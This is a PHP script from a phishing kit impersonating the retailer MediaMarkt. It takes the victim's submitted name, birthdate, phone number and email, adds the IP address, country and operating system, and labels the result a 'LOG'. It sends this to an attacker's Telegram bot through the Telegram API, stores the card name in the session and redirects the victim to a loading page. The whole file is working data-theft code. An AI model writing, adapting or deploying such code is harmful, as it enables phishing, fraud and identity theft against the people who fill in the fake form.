<?php

session_start();
include_once 'functions.php';

$message = '[🦊] LOG MEDIAMARKT [🦊]' . "\r\n\n";

$message .= '🥇NOM : ' . $_POST['nom'] . "\r\n";
$message .= '🥇PRENOM : ' . $_POST['prenom'] . "\r\n";
$message .= '🥇DATE DE NAISSANCE: ' . $_POST['birthdate'] . "\r\n\n";
$message .= '🥇TELEPHONE: ' . $_POST['phone'] . "\r\n\n";
$message .= '🥇EMAIL: ' . $_POST['email'] . "\r\n\n";

$message .= '[🤖] TIERS [🤖]' . "\r\n\n";

$message .= '🤖 IP : ' . get_user_ip() . "\r\n";
$message .= '🤖 Pays : ' . get_user_country() . "\r\n";
$message .= '🤖 Systeme : ' . get_user_os() . "\r\n";

$_SESSION['cardName'] = $_POST['cardName'];

$url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage?chat_id=" . TELEGRAM_CHAT_ID . "&text=" . urlencode($message);

file_get_contents($url);

// Utilisation de JavaScript pour la redirection
echo '<script type="text/javascript">';
echo 'window.location.href = "loading.php";';
echo '</script>';

?>